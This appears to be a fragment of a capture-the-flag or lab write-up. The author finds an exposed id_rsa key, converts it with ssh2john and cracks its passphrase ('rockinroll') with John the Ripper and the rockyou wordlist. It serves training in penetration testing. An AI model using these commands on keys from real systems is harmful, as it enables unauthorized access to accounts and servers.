A link to an id_rsa appears. I copy to a txt file and crack it with ssh2john.

Start by compiling the RSA key to a hash, in `/usr/share/john`,
`python3 ssh2john.py /home/kali/Desktop/rsa.txt > /home/kali/Desktop/forjohn.txt`

 Back at `/Desktop`,
 `john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=ssh`

`rockinroll       (/home/kali/Desktop/rsa.txt) `
